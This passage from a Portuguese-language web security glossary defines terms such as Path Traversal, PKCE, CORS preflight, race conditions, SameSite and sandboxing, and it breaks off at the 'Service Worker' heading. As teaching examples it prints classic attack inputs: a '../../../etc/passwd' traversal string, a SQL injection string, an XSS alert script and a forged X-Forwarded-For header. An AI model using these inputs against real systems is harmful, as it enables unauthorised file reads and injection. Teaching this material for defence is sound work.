- **Significado**: Vulnerabilidade de manipulação de caminhos de sistema de arquivos (intimamente ligada e frequentemente usada como sinônimo técnico de **Directory Traversal**, sendo *Path Traversal* o termo mais abrangente da CWE-22 por englobar também caminhos absolutos como `/etc/passwd` ou `C:\Windows\win.ini` e codificações URL/Unicode como `%2e%2e%2f` ou `%252e%252e%252f`). Ocorre quando a aplicação constrói um caminho de leitura ou gravação de arquivo concatenando entradas do usuário sem antes **canonicalizar** o caminho (resolver todos os `..`, `.` e links simbólicos via `path.resolve()` / `realpath()`) e verificar estritamente se o caminho canônico resultante começa com o diretório base autorizado (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: É quando você permite que o cliente digite o nome de um arquivo para baixar da pasta `/relatorios/`, mas ele digita `../../../etc/passwd` (ou codificado como `%2e%2e%2f`), fazendo o sistema subir três pastas para trás até a raiz do servidor e entregar a lista de usuários do sistema.
- **Exemplo de utilização**: Prevenção correta via canonicalização e verificação de prefixo em Node.js (`path.resolve`):
  ```javascript
  const baseDir = path.resolve('/var/www/uploads_seguros');
  const caminhoFinal = path.resolve(baseDir, nomeArquivoUsuario);
  if (!caminhoFinal.startsWith(baseDir + path.sep)) {
    throw new Error('Tentativa de Path Traversal bloqueada!');
  }
  ```

##### Payload (Carga Útil)
- **Nome**: Payload (Carga Útil de Rede, de Requisição HTTP, de Token JWT ou de Teste de Segurança).
- **Significado**: Termo técnico polissêmico que designa os **dados efetivos transportados** por uma estrutura, descontados os cabeçalhos de controle e metadados de encapsulamento:
  1. **Em Redes e HTTP**: o corpo da mensagem (*message body*, ex.: o JSON enviado em um `POST` ou `PUT`), inspecionado na sub-aba **Payload** da aba [Network](./02a-devtools-network.md#s2-1) do Chrome DevTools (que exibe *Query String Parameters*, *Form Data* e *Request Payload*).
  2. **Em JWT**: a segunda parte do token (`Header.Payload.Signature`), contendo as *claims* (dados do usuário e expiração).
  3. **Em Cibersegurança**: a string ou sequência de bytes construída especificamente para demonstrar ou explorar uma vulnerabilidade em laboratório autorizado (ex.: `' OR '1'='1` em SQLi ou `<script>alert(1)</script>` em XSS).
- **Explicação simples**: Em um caminhão de mudanças, a cabine do motorista, a placa e a nota fiscal presa no para-brisa são os cabeçalhos (*Headers*); os móveis e caixas guardados dentro do baú são o **Payload** (a carga útil).
- **Exemplo de utilização**: Na aba **Network**, clique sobre uma requisição `POST /api/login` e selecione a sub-aba **Payload** para visualizar o objeto JSON enviado pelo front-end ao servidor.

##### Permissions-Policy
- **Nome**: `Permissions-Policy` (Cabeçalho HTTP de Política de Permissões de APIs do Navegador — sucessor do antigo `Feature-Policy`).
- **Significado**: Header de segurança de resposta HTTP que permite ao desenvolvedor habilitar, restringir ou desativar completamente o uso de APIs sensíveis do navegador e recursos de hardware (como câmera `camera`, microfone `microphone`, geolocalização `geolocation`, pagamento `payment`, USB `usb`, tela cheia `fullscreen` e leitura da área de transferência `clipboard-read`) tanto no documento principal quanto em elementos `<iframe>` incorporados na página. Reduz drasticamente a superfície de ataque caso a página sofra uma injeção de script ou incorpore widgets de terceiros (veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: É o painel de disjuntores do apartamento: se o seu site é uma loja de livros que nunca precisa ligar a webcam nem o microfone do cliente, você desliga esses disjuntores na entrada (`camera=(), microphone=()`) para que nenhum script malicioso ou iframe consiga ativá-los.
- **Exemplo de utilização**: Cabeçalho HTTP desabilitando recursos sensíveis de hardware para todas as origens (`()`):
  ```http
  Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=(self)
  ```

##### PKCE (Proof Key for Code Exchange)
- **Nome**: PKCE (*Proof Key for Code Exchange*, pronunciado *"pixy"* — Chave de Prova para Troca de Código — RFC 7636).
- **Significado**: Extensão de segurança para o fluxo *Authorization Code* do **OAuth 2.0** (originalmente criada para aplicativos móveis e SPAs que não podem guardar um `client_secret` confidencial, e hoje **[REQUISITO]** para todos os tipos de clientes no OAuth 2.1) que previne ataques de **interceptação ou injeção do código de autorização**. Antes de redirecionar o usuário ao servidor de autorização, o cliente gera um segredo efêmero aleatório (`code_verifier`) e envia apenas o seu hash SHA-256 codificado em Base64URL (`code_challenge` com `code_challenge_method=S256`). Quando o código de autorização (`code`) retorna pela URL, o cliente só consegue trocá-lo pelo *Access Token* se apresentar o `code_verifier` original correspondente àquele hash.
- **Explicação simples**: Ao fazer um pedido, você cria uma senha secreta na hora, guarda no bolso e entrega ao atendente apenas um cadeado fechado com essa senha (`code_challenge`). Quando o seu pacote fica pronto, mesmo que um ladrão roube o comprovante de retirada na fila (`code`), ele não consegue retirar o pacote no balcão porque não tem a senha original (`code_verifier`) que abre aquele cadeado.
- **Exemplo de utilização**: Geração da relação matemática do método `S256` do PKCE:
  ```text
  code_challenge = BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))
  ```

##### POP3 (Post Office Protocol v3)
- **Nome**: POP3 (*Post Office Protocol version 3* — Protocolo de Agência de Correio versão 3 — RFC 1939, portas **110 TCP** e **995 TCP para POP3S**).
- **Significado**: Protocolo clássico da camada de Aplicação utilizado por clientes de correio eletrônico para recuperar mensagens armazenadas em um servidor remoto. Seu modelo operacional padrão conecta-se ao servidor, baixa todas as mensagens novas para o armazenamento local do dispositivo do usuário e (por padrão) as exclui do servidor, não oferecendo sincronização nativa de múltiplas pastas ou estados de leitura entre diferentes dispositivos (função cumprida pelo **IMAP**). A porta **110** sem criptografia expõe usuário, senha e e-mails em texto claro na rede, exigindo-se o uso de **POP3S na porta 995 TCP** (sobre TLS).
- **Explicação simples**: É ir até a caixa postal dos Correios, tirar todas as cartas de lá de dentro, levá-las para a gaveta do seu escritório em casa e deixar a caixa postal lá na agência vazia.
- **Exemplo de utilização**: Auditoria de portas verificando se a porta legada `110/TCP` está fechada em favor das portas seguras `995/TCP` (POP3S) ou `993/TCP` (IMAPS).

##### Porta de Rede (Network Port)
- **Nome**: Porta Lógica de Rede (*Network Port* — Camada de Transporte TCP/UDP).
- **Significado**: Identificador numérico inteiro sem sinal de **16 bits** (variando de **`0` a `65535`**, pois $2^{16} - 1 = 65535$) presente nos cabeçalhos dos protocolos de transporte (**TCP**, **UDP**, **SCTP**) utilizado pelo sistema operacional para realizar a **multiplexação e demultiplexação** de tráfego, entregando cada segmento ou datagrama ao processo de aplicação correto dentro do mesmo host (identificado por um único endereço IP). A **IANA** (*Internet Assigned Numbers Authority*) divide as portas em três faixas oficiais:
  - **Portas Bem Conhecidas (*Well-Known / System Ports*): `0` a `1023`** (ex.: `20/21` FTP, `22` SSH, `23` Telnet, `25` SMTP, `53` DNS, `67/68` DHCP, `80` HTTP, `110` POP3, `143` IMAP, `443` HTTPS, `445` SMB);
  - **Portas Registradas (*Registered Ports*): `1024` a `49151`** (ex.: `3306` MySQL, `3389` RDP, `5432` PostgreSQL, `8080` HTTP alternativo);
  - **Portas Dinâmicas / Efêmeras / Privadas (*Dynamic / Ephemeral Ports*): `49152` a `65535`** (alocadas temporariamente pelo sistema operacional do **cliente** como porta de origem ao abrir uma conexão de saída — veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: Se o endereço IP é o endereço do edifício comercial, a **Porta de Rede** é o número da sala ou do ramal interno dentro daquele edifício: a sala `443` é o atendimento web HTTPS, a sala `22` é a administração SSH e a sala `5432` é o arquivo do banco de dados PostgreSQL.
- **Exemplo de utilização**: Listando todas as portas TCP e UDP em estado de escuta (`LISTEN`) e os processos associados no sistema operacional:
  ```bash
  # Linux
  ss -tulnp
  # Windows
  netstat -ano | findstr LISTENING
  ```

##### Preflight (Requisição de Pré-verificação CORS via `OPTIONS`)
- **Nome**: CORS Preflight Request (Requisição de Pré-voo / Pré-verificação CORS — WHATWG Fetch Standard).
- **Significado**: Requisição HTTP automática enviada pelo navegador utilizando o método **`OPTIONS`** **antes** de disparar a requisição real quando um script tenta fazer uma chamada *cross-origin* que **não se enquadra como "requisição simples"** (por exemplo: quando utiliza métodos como `PUT`, `PATCH` ou `DELETE`, quando envia `Content-Type: application/json` ou quando inclui cabeçalhos personalizados como `Authorization` ou `X-API-Key`). A requisição *preflight* envia os cabeçalhos `Origin`, `Access-Control-Request-Method` e `Access-Control-Request-Headers`. O navegador só envia a requisição real se o servidor responder ao `OPTIONS` com status `2xx` (como `204 No Content` ou `200 OK`) e com os cabeçalhos `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods` e `Access-Control-Allow-Headers` autorizando explicitamente a operação.
- **Explicação simples**: Antes de um avião cargueiro de outra companhia pousar com uma carga especial (`DELETE` ou JSON com `Authorization`), a torre de controle do navegador manda um rádio de consulta rápida (`OPTIONS`) perguntando ao aeroporto de destino: "Vocês aceitam voo vindo da origem X com esse tipo de carga?". Se o aeroporto disser não, o avião nem decola.
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1), ao fazer um `fetch('https://api.exemplo.test/v1/item/5', { method: 'DELETE' })` a partir de `https://app.exemplo.test`, aparecem **duas** linhas na tabela: primeiro a requisição `OPTIONS` (Tipo: `preflight`) e logo abaixo a requisição `DELETE` (Tipo: `fetch`).

##### Proxy Reverso (Reverse Proxy)
- **Nome**: Proxy Reverso (*Reverse Proxy*).
- **Significado**: Servidor intermediário (como Nginx, Apache, HAProxy, Traefik ou uma CDN como Cloudflare) posicionado na frente de um ou mais servidores de aplicação internos (*origin servers*), recebendo todas as conexões vindas da Internet pública em nome deles. Diferentemente do **Forward Proxy** (que fica do lado do cliente e esconde a identidade dos clientes internos), o **Proxy Reverso fica do lado do servidor e protege/esconde a infraestrutura interna de servidores**: o cliente externo enxerga apenas o IP público do Proxy Reverso. Suas funções incluem **terminação TLS/HTTPS**, **balanceamento de carga**, **cache de arquivos estáticos**, **compressão (`gzip`/`br`)**, injeção centralizada de **headers de segurança** (`HSTS`, `CSP`) e filtragem **WAF**.
- **Explicação simples**: É o balcão de atendimento ao público na recepção de um laboratório: o cliente entrega seu pedido no balcão da frente sem nunca saber quantos técnicos existem lá atrás, em quais salas eles trabalham ou quais máquinas internas estão ligadas.
- **Exemplo de utilização**: Bloco Nginx atuando como Proxy Reverso HTTPS para uma aplicação Node.js que roda apenas localmente na porta `3000`:
  ```nginx
  location /api/ {
      proxy_pass http://127.0.0.1:3000;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
  }
  ```

---

<a id="s8-q"></a>
### 8.17 Letra Q

##### Query String (Parâmetros de Consulta na URL)
- **Nome**: Query String (Cadeia de Consulta de URL — RFC 3986).
- **Significado**: Componente opcional de uma URL iniciado pelo caractere de interrogação (`?`) e posicionado após o caminho (*path*) e antes do fragmento (`#`), estruturado convencionalmente como pares `chave=valor` separados por `&` (ex.: `?termo=redes&pagina=2&ordem=asc`) e codificados via *Percent-Encoding* (`encodeURIComponent()`). **Regra de ouro de segurança (muito cobrada em provas)**: mesmo quando a conexão utiliza **HTTPS** (que cifra a URL em trânsito na rede), a Query String **jamais** deve ser usada para transportar dados sensíveis (senhas, tokens JWT, chaves de API, CPF ou números de cartão), pois a URL completa fica exposta em texto claro no **histórico do navegador**, nos **logs de acesso de servidores web, CDNs e proxies** (`access.log`) e pode vazar para domínios externos através do cabeçalho HTTP **`Referer`** (veja [Análise de Segurança na Aba Network](./02a-devtools-network.md#s2-1)).
- **Explicação simples**: A Query String é o texto escrito na parte da frente do envelope, logo abaixo do endereço: mesmo que o caminhão dos Correios seja blindado na estrada (HTTPS), quando o envelope chega ao prédio ele é fotografado pelas câmeras da portaria (logs do servidor) e fica registrado no caderno de visitas (histórico do navegador).
- **Exemplo de utilização**: Na aba [Network](./02a-devtools-network.md#s2-1), ao selecionar uma requisição `GET /busca?categoria=cybersec&limite=20`, a sub-aba **Payload** decodifica e lista automaticamente os *Query String Parameters*.

##### QUIC (Quick UDP Internet Connections)
- **Nome**: QUIC (*Quick UDP Internet Connections*, hoje o nome oficial do protocolo na RFC 9000, não mais apenas um acrônimo).
- **Significado**: Protocolo de transporte de propósito geral, multiplexado e criptografado por padrão, padronizado pelo IETF na **RFC 9000** sobre **UDP**, que serve como a camada de transporte subjacente do **HTTP/3** (RFC 9114). O QUIC move para o espaço de usuário sobre UDP funções que antes estavam separadas entre o kernel TCP e o TLS: oferece controle de congestionamento, entrega confiável ordenada **por fluxo independente** (eliminando o *Head-of-Line Blocking* do TCP), incorpora nativamente o handshake criptográfico do **TLS 1.3** (reduzindo o estabelecimento de conexão para **1-RTT** ou **0-RTT** em conexões retomadas), cifra quase todos os metadados dos próprios cabeçalhos de transporte e suporta **Connection Migration** via *Connection ID*.
- **Explicação simples**: Em vez de construir uma estrada segura em três etapas demoradas separadas (UDP/IP $\rightarrow$ TCP $\rightarrow$ TLS), o QUIC junta o motor de entrega confiável e a blindagem criptográfica TLS 1.3 dentro de um único veículo ágil que roda sobre UDP.
- **Exemplo de utilização**: Identificado na coluna **Protocol** da aba [Network](./02a-devtools-network.md#s2-1) como `h3` (HTTP/3 sobre QUIC na porta 443 UDP).

---

<a id="s8-r"></a>
### 8.18 Letra R

##### Race Condition (Condição de Corrida / TOCTOU)
- **Nome**: Race Condition (Condição de Corrida — CWE-362) e TOCTOU (*Time-of-Check to Time-of-Use* — CWE-367).
- **Significado**: Vulnerabilidade de concorrência que ocorre quando o comportamento e a segurança de um sistema dependem da ordem temporal exata em que múltiplas threads, processos ou requisições HTTP paralelas acessam e modificam um estado compartilhado. Na variante clássica **TOCTOU** (*Time-of-Check to Time-of-Use*), existe uma janela de tempo microscópica entre o instante em que a aplicação **verifica** uma condição (ex.: `SELECT saldo FROM contas WHERE id = 1` $\rightarrow$ saldo = R$ 100) e o instante em que ela **atualiza** o valor (`UPDATE contas SET saldo = saldo - 100`). Se um atacante disparar 20 requisições simultâneas sincronizadas (ex.: usando multiplexação *single-packet attack* em HTTP/2), todas as 20 podem passar pela verificação de saldo antes que a primeira atualização seja gravada, permitindo resgatar um cupom de uso único 20 vezes ou sacar valores acima do saldo disponível (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)).
- **Explicação simples**: Você tem R$ 100 na conta e dois caixas eletrônicos diferentes consultam seu saldo no exato mesmo milissegundo: ambos leem "Saldo = R$ 100, pode liberar o saque" antes que qualquer um dos dois consiga anotar que o dinheiro já saiu.
- **Exemplo de utilização**: Correção no banco de dados utilizando operação atômica com verificação na própria cláusula `UPDATE` ou bloqueio pessimista (`SELECT ... FOR UPDATE`) dentro de uma transação:
  ```sql
  UPDATE contas
  SET saldo = saldo - 100
  WHERE id = 42 AND saldo >= 100;
  -- Verifica-se se o número de linhas afetadas (affectedRows) foi igual a 1.
  ```

##### Rate Limiting (Limitação de Taxa de Requisições)
- **Nome**: Rate Limiting (Controle e Limitação de Taxa de Requisições).
- **Significado**: Controle defensivo de disponibilidade e segurança (aplicado em API Gateways, WAFs, Proxies Reversos como Nginx ou middlewares de aplicação) que restringe a quantidade máxima de requisições que um determinado cliente (identificado por endereço IP, usuário autenticado, chave de API ou conta alvo) pode realizar dentro de uma janela de tempo (ex.: máximo de 5 tentativas de login por minuto ou 100 chamadas à API por minuto). Quando o limite é excedido, o servidor interrompe o processamento e retorna o código de status HTTP **`429 Too Many Requests`** acompanhado do cabeçalho `Retry-After`. É **[REQUISITO]** para mitigar ataques de **Força Bruta**, *Credential Stuffing*, enumeração de usuários/IDOR em massa, raspagem abusiva (*scraping*) e negação de serviço na camada de aplicação (L7 DoS).
- **Explicação simples**: É uma catraca com temporizador: permite passar uma pessoa a cada poucos segundos normalmente, mas trava imediatamente se alguém tentar passar 500 vezes em um único segundo.
- **Exemplo de utilização**: Resposta HTTP padrão quando o limite de taxa é atingido:
  ```http
  HTTP/1.1 429 Too Many Requests
  Retry-After: 60
  Content-Type: application/json

  {"erro": "Limite de tentativas excedido. Aguarde 60 segundos."}
  ```

##### RDP (Remote Desktop Protocol)
- **Nome**: RDP (*Remote Desktop Protocol* — Protocolo de Área de Trabalho Remota da Microsoft, porta padrão **3389 TCP e UDP**).
- **Significado**: Protocolo proprietário desenvolvido pela Microsoft que fornece a um usuário uma interface gráfica completa (*GUI*) para se conectar e administrar remotamente outro computador ou servidor Windows através da rede. **Risco crítico de segurança**: a porta **3389 jamais deve ficar exposta diretamente para a Internet pública** (`0.0.0.0/0`), pois serviços RDP expostos são um dos principais vetores mundiais de entrada para grupos de **Ransomware** (por meio de força bruta de credenciais, *password spraying* ou exploração de falhas históricas como *BlueKeep* — CVE-2019-0708). O acesso administrativo via RDP deve exigir obrigatoriamente **VPN** corporativa ou *RD Gateway* com **MFA**, **NLA** (*Network Level Authentication*) ativado e restrição por firewall (veja [Redes de Computadores](./04-redes-de-computadores.md#s4)).
- **Explicação simples**: É um cabo de vídeo, teclado e mouse estendido pela rede até a tela de um servidor Windows distante: se você deixar essa tomada pendurada para o lado de fora do muro da empresa na rua (porta 3389 aberta na Internet), ladrões do mundo inteiro vão tentar digitar senhas nela o dia todo.
- **Exemplo de utilização**: Regra de firewall bloqueando acesso externo à porta `3389` e permitindo apenas a partir da sub-rede interna da VPN (`10.8.0.0/24`).

##### Referrer-Policy
- **Nome**: `Referrer-Policy` (Cabeçalho HTTP de Política de Referenciador — W3C Specification).
- **Significado**: Header de segurança de resposta HTTP (ou atributo HTML `referrerpolicy`) que governa quanto da URL da página atual o navegador deve incluir no cabeçalho de requisição **`Referer`** *(nota: o cabeçalho histórico `Referer` tem erro ortográfico na RFC original sem um "r", enquanto o header de política `Referrer-Policy` é grafado corretamente com dois "r")* quando o usuário clica em um link ou quando a página carrega imagens/scripts de outros domínios. Seus 8 valores oficiais incluem `no-referrer` (omisssão total), `same-origin`, `strict-origin`, `strict-origin-when-cross-origin` (**padrão atual nos navegadores modernos**: envia a URL completa na mesma origem, apenas a `origem` em HTTPS$\rightarrow$HTTPS cross-origin, e nada em downgrade HTTPS$\rightarrow$HTTP) e o perigoso `unsafe-url` (que envia caminho e query string até para sites HTTP externos — veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).
- **Explicação simples**: Quando você sai de uma sala da empresa e entra no prédio vizinho, a `Referrer-Policy` decide se o seu crachá vai dizer apenas "Vim da Empresa X" (`strict-origin`) ou se vai entregar a ficha detalhada dizendo "Vim da sala secreta do projeto de fusão nº 42 da Empresa X" (`unsafe-url`).
- **Exemplo de utilização**: Configuração recomendada para aplicações com rotas internas sensíveis:
  ```http
  Referrer-Policy: strict-origin-when-cross-origin
  ```
  *(Ou `Referrer-Policy: no-referrer` para painéis administrativos e fluxos de redefinição de senha).*

##### REST (Representational State Transfer)
- **Nome**: REST (*Representational State Transfer* — Transferência de Estado Representacional).
- **Significado**: Estilo arquitetural para sistemas hipermídia distribuídos definido por Roy Fielding (um dos autores principais da especificação HTTP) em sua tese de doutorado no ano 2000. Uma API **RESTful** organiza os dados e funcionalidades como **Recursos** (*Resources*) identificados por URIs substantivas (`/usuarios/42/pedidos`) e manipulados através de **Representações** (tipicamente em **JSON**) utilizando a **interface uniforme** dos métodos semânticos e códigos de status do próprio protocolo HTTP (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`; `200`, `201`, `204`, `400`, `401`, `403`, `404`), obedecendo a restrições como arquitetura **Cliente-Servidor**, comunicação **Stateless** (cada requisição contém toda a informação necessária para ser compreendida, sem depender de contexto de sessão armazenado em memória de conversa no servidor) e **Cacheabilidade**.
- **Explicação simples**: Em vez de cada empresa inventar comandos próprios confusos na URL como `/fazerAcaoDeApagarUsuarioAgora?id=42` via `GET`, o REST usa o endereço apenas para dar nome à coisa (`/usuarios/42`) e usa o verbo padrão do protocolo HTTP (`DELETE`) para dizer o que fazer com ela.
- **Exemplo de utilização**: Endpoint RESTful retornando `201 Created` e o cabeçalho `Location` ao criar um novo recurso:
  ```http
  POST /api/v1/cursos HTTP/1.1
  Host: api.exemplo.test
  Content-Type: application/json

  {"titulo": "Segurança Web e Redes"}

  HTTP/1.1 201 Created
  Location: /api/v1/cursos/108
  Content-Type: application/json

  {"id": 108, "titulo": "Segurança Web e Redes"}
  ```

##### Reverse Proxy (Proxy Reverso)
- **Nome**: Reverse Proxy (termo em inglês para **Proxy Reverso** — veja também o verbete *Proxy Reverso* na [Letra P](#s8-p)).
- **Significado**: Componente arquitetural de borda de servidor (Camada 7 ou Camada 4) que intercepta requisições de clientes externos na Internet e as distribui de forma transparente para servidores internos de origem, ocultando a topologia interna da rede. Na análise de segurança na aba [Network](./02a-devtools-network.md#s2-1) do DevTools, sua presença é identificada pelos cabeçalhos de resposta `Server` (ex.: `cloudflare`, `nginx`, `envoy`), `Via`, `X-Cache` e pelo fato de o endereço na coluna **Remote Address** pertencer à faixa de IPs do provedor de borda/CDN, e não ao servidor de aplicação final.
- **Explicação simples**: É o escudo frontal do servidor: todo mundo na Internet conversa com o *Reverse Proxy* na fachada do prédio, e só ele tem acesso ao corredor interno onde ficam os servidores reais da aplicação.
- **Exemplo de utilização**: Cuidado de segurança crítico no back-end atrás de um *Reverse Proxy*: o servidor de aplicação **só** deve confiar no cabeçalho `X-Forwarded-For` se a conexão TCP vier comprovadamente do IP interno do seu próprio *Reverse Proxy* (`trust proxy`), pois qualquer cliente externo malicioso pode enviar um `X-Forwarded-For: 127.0.0.1` forjado se conseguir conectar-se diretamente ou se o proxy não sobrescrever o cabeçalho.

##### Roteamento (Routing IP)
- **Nome**: Roteamento de Pacotes (*IP Routing* — Camada 3 do Modelo OSI).
- **Significado**: Processo de tomada de decisão executado na **Camada de Rede (Camada 3)** por roteadores e hosts multi-homed para selecionar o melhor caminho (*next hop* / próximo salto) através de redes interconectadas até entregar um pacote IP ao seu destino final. A decisão baseia-se na consulta à **Tabela de Roteamento** aplicando a regra de **Correspondência do Prefixo Mais Longo** (*Longest Prefix Match* — LPM): entre todas as rotas que casam com o IP de destino, o roteador escolhe sempre aquela com a máscara CIDR mais específica (ex.: uma rota `/26` tem prioridade sobre uma `/24`, que por sua vez tem prioridade sobre a rota padrão `/0`). Pode ser configurado de forma **estática** (manual) ou aprendida via protocolos de **roteamento dinâmico** como **OSPF** (interno, IGP) e **BGP** (*Border Gateway Protocol*, o protocolo que interconecta os Sistemas Autônomos da Internet global).
- **Explicação simples**: É o sistema de placas de trânsito nos cruzamentos das rodovias: a cada cidade (roteador) que o caminhão chega, o fiscal olha o CEP de destino e aponta a saída mais específica ("Para o bairro Centro de Campinas, pegue a saída `/26` à direita; para qualquer outro lugar do mundo, siga pela rodovia padrão `/0`").
- **Exemplo de utilização**: Pela regra do *Longest Prefix Match*, um pacote destinado a `10.1.2.50` em um roteador que possui as rotas `10.0.0.0/8` (via Gate A), `10.1.0.0/16` (via Gate B) e `10.1.2.0/24` (via Gate C) será obrigatoriamente encaminhado pelo **Gate C** (`/24` é o prefixo mais longo).


---

<a id="s8-s"></a>
### 8.19 Letra S

##### Salt (Sal Criptográfico)
- **Nome**: Salt (Sal Criptográfico para Hashing de Senhas).
- **Significado**: Sequência de bytes aleatórios criptograficamente seguros (tipicamente de 128 bits / 16 bytes ou mais), gerada de forma **única para cada usuário/senha** e concatenada à senha antes da aplicação da função de hash (como **Argon2id** ou **bcrypt**). O *salt* não precisa ser secreto (é armazenado em texto claro junto com o hash resultante no banco de dados), mas cumpre duas funções vitais: (1) garante que **dois usuários que escolherem exatamente a mesma senha** (ex.: `Senha@2026`) terão hashes completamente diferentes no banco de dados; e (2) **inutiliza ataques de tabelas pré-computadas (*Rainbow Tables*)**, forçando o atacante a quebrar cada hash individualmente do zero.
- **Explicação simples**: É um tempero exclusivo colocado em cada prato antes de bater no liquidificador: mesmo que dois clientes peçam exatamente a mesma receita de vitamina ("senha123"), como cada copo levou uma pitada de um ingrediente único (*salt*), o resultado final dos dois copos fica totalmente diferente, impedindo que um ladrão use uma tabela pronta de sabores para adivinhar a receita.
- **Exemplo de utilização**: No hash bcrypt `$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW`, os 22 caracteres imediatamente após o terceiro `$` (`R9h/cIPz0gi.URNNX3kh2O`) representam o *salt* único de 128 bits codificado em Base64.

##### Same-Origin Policy (SOP — Política de Mesma Origem)
- **Nome**: Same-Origin Policy (SOP — Política de Mesma Origem — RFC 6454 / WHATWG HTML Standard).
- **Significado**: O alicerce fundamental do modelo de segurança dos navegadores web, que restringe como um documento ou script carregado de uma **origem** (`esquema + host + porta`) pode interagir com um recurso pertencente a outra origem. Regra exata cobrada em provas sobre o que a SOP permite ou bloqueia por padrão:
  - **Escritas cross-origin (*Cross-origin writes*)**: **normalmente permitidas** (ex.: submeter um formulário `<form>` ou clicar em um link para outra origem — e é justamente por isso que ataques de **CSRF** existem e exigem tokens anti-CSRF ou `SameSite`!).
  - **Incorporações cross-origin (*Cross-origin embeddings*)**: **normalmente permitidas** (ex.: carregar `<script src>`, `<link rel="stylesheet">`, `<img>`, `<video>`, `<iframe>` de outra origem — restringíveis via **CSP**, **CORP**, **COEP** e `X-Frame-Options`).
  - **Leituras cross-origin (*Cross-origin reads*)**: **ESTRITAMENTE BLOQUEADAS por padrão** (um script em `https://malicioso.test` **não consegue ler** a resposta de um `fetch()` feito para `https://banco.exemplo.test`, nem ler o DOM de um `<iframe>` cross-origin, nem ler o `localStorage`/`IndexedDB` de outra origem), a menos que o servidor de destino autorize explicitamente via **CORS** (veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).
- **Explicação simples**: A SOP é a parede de concreto entre as abas do seu navegador: se você estiver com o site do seu banco aberto na Aba 1 e abrir um site de jogos desconhecido na Aba 2, a SOP impede que o código JavaScript do jogo "espione" e leia o extrato bancário da Aba 1.
- **Exemplo de utilização**: Tentativa de leitura cross-origin bloqueada pela SOP no [Console](./02c-devtools-console.md#s2-3) do DevTools:
  ```text
  Access to fetch at 'https://api.banco.test/saldo' from origin 'https://jogos.test'
  has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
  ```

##### SameSite (Atributo de Cookie)
- **Nome**: `SameSite` (Atributo do Cabeçalho `Set-Cookie` — RFC 6265bis).
- **Significado**: Diretiva de segurança de cookies que declara se (e em quais circunstâncias) o cookie deve ser restrito a um contexto de primeira parte (*first-party* / *same-site*) ou se pode ser enviado em requisições originadas de sites terceiros (*cross-site*). Aceita três valores: `Strict` (envio exclusivo dentro do próprio site), `Lax` (comportamento padrão moderno: bloqueia sub-recursos e `POST` cross-site, mas envia em navegações `GET` de nível superior como links `<a href>`) e `None` (envia em contextos cross-site, exigindo obrigatoriamente o atributo `Secure` — veja também o verbete *Lax, Strict e None* na [Letra L](#s8-l)).
- **Explicação simples**: É a regra gravada no crachá que diz se o navegador deve mostrá-lo apenas quando você está caminhando dentro da própria empresa (`Strict`), também quando você entra pela porta principal vindo da rua (`Lax`), ou até quando outra empresa pede um serviço em seu nome (`None; Secure`).
- **Exemplo de utilização**: Configuração de cookie de sessão administrativa com proteção máxima contra CSRF:
  ```http
  Set-Cookie: __Host-admin_sid=4a8b9c; Path=/; Secure; HttpOnly; SameSite=Strict
  ```

##### Sandbox (Isolamento de Execução e Atributo `sandbox`)
- **Nome**: Sandbox (Caixa de Areia / Ambiente de Execução Isolado e Atributo HTML `<iframe sandbox>`).
- **Significado**: Mecanismo de segurança baseado no princípio do **menor privilégio** que executa código não confiável dentro de um ambiente estritamente isolado e com permissões mínimas:
  1. **Arquitetura do Navegador**: o Google Chrome isola cada site em seu próprio processo de renderização (*Site Isolation* / *Renderer Process Sandbox*) sem acesso direto ao sistema de arquivos ou ao sistema operacional.
  2. **Atributo HTML `<iframe sandbox>`**: quando adicionado vazio (`<iframe src="..." sandbox>`) a um iframe, aplica **máxima restrição**: trata o conteúdo como pertencente a uma origem opaca única (`null`), **bloqueia execução de scripts JavaScript**, bloqueia envio de formulários, bloqueia pop-ups (`window.open`) e impede navegação da janela principal (`top`). Permissões específicas só são reabilitadas individualmente via tokens como `allow-scripts`, `allow-forms` ou `allow-same-origin`. **Alerta crítico de segurança**: combinar `sandbox="allow-scripts allow-same-origin"` em um iframe que carrega conteúdo da **mesma origem** da página pai anula a proteção, pois o script dentro do iframe pode acessar o DOM pai e remover o próprio atributo `sandbox`!
- **Explicação simples**: É um cercadinho acolchoado onde uma criança brinca sem conseguir alcançar as tomadas nem abrir a porta da rua: o conteúdo lá dentro aparece na tela, mas não consegue executar comandos perigosos fora do cercadinho.
- **Exemplo de utilização**: Incorporando conteúdo HTML não confiável sem permitir scripts nem acesso à origem principal:
  ```html
  <iframe srcdoc="<p>Pré-visualização segura de conteúdo do usuário</p>" sandbox></iframe>
  ```

##### Secure (Atributo de Cookie)
- **Nome**: `Secure` (Atributo de Segurança do Cabeçalho `Set-Cookie` — RFC 6265).
- **Significado**: Flag booleana incluída no cabeçalho `Set-Cookie` que instrui o navegador a **transmitir aquele cookie exclusivamente sobre conexões criptografadas HTTPS (TLS)**, proibindo terminantemente o seu envio em requisições HTTP em texto claro (com exceção de ambientes locais de desenvolvimento `http://localhost` em navegadores modernos). Seu uso é **[REQUISITO]** para todos os cookies de sessão e autenticação (para evitar o roubo do cookie em ataques de *SSL Stripping* ou downgrade HTTP em redes Wi-Fi públicas), além de ser obrigatório sempre que se utiliza `SameSite=None` ou os prefixos `__Secure-` e `__Host-` (veja [Application > Cookies](./02b-devtools-application.md#s2-2)).
- **Explicação simples**: É uma ordem dada ao portador do documento: "Este crachá só pode sair do prédio se for dentro de um carro-forte blindado (HTTPS); se alguém pedir para mandá-lo de moto comum (HTTP), não entregue de jeito nenhum".
- **Exemplo de utilização**: Na tabela **Application > Cookies** do DevTools, verifique se a coluna **Secure** possui o marcador `✓` em todos os cookies da aplicação.

##### Service Worker
